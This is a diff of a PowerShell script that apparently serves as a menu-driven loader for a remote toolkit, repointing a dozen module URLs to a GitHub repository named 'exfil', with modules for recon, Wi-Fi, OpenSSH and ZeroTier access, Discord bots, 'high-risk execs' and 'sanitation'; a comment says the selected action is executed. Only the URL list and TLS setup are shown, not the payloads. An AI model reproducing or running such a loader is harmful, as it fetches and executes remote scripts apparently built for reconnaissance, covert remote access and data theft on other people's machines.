@@ -44,18 +44,18 @@ foreach ($tlsProtocol in $AvailableTls) {
     [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol
 }
 $actions = @(
-    "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Archives/ArchivesLedger.ps1",
-    "https://codeberg.org/sempiampi/mavericks/raw/branch/main/CoreFunctions/CoreFunctionsLedger.ps1",
-    "https://codeberg.org/sempiampi/mavericks/raw/branch/main/DiscordBots/DiscordBotsLedger.ps1",
-    "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/GlobalFilesLedger.ps1",
-    "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Miscellaneous/MiscellaneousLedger.ps1",
-    "https://codeberg.org/sempiampi/mavericks/raw/branch/main/OpenSSHStuff/OpenSSHStuffLedger.ps1",
-    "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Recon/ReconLedger.ps1",
-    "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Sanitation/SanitationLedger.ps1",
-    "https://codeberg.org/sempiampi/mavericks/raw/branch/main/WifiRelated/WifiRelatedLedger.ps1",
-    "https://codeberg.org/sempiampi/mavericks/raw/branch/main/ZeroTierStuff/ZeroTierStuffLedger.ps1",
-    "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Sanitation/SanitationLedger.ps1",
-    "https://codeberg.org/sempiampi/mavericks/raw/branch/main/HighRiskExecs/HighRiskExecsLedger.ps1"
+    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Archives/ArchivesLedger.ps1",
+    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/CoreFunctions/CoreFunctionsLedger.ps1",
+    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/DiscordBots/DiscordBotsLedger.ps1",
+    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/GlobalFilesLedger.ps1",
+    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Miscellaneous/MiscellaneousLedger.ps1",
+    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/OpenSSHStuff/OpenSSHStuffLedger.ps1",
+    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Recon/ReconLedger.ps1",
+    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Sanitation/SanitationLedger.ps1",
+    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/WifiRelated/WifiRelatedLedger.ps1",
+    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/ZeroTierStuff/ZeroTierStuffLedger.ps1",
+    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Sanitation/SanitationLedger.ps1",
+    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/HighRiskExecs/HighRiskExecsLedger.ps1"
         
 )
 # Call the function to display the action menu and execute the selected action or quit
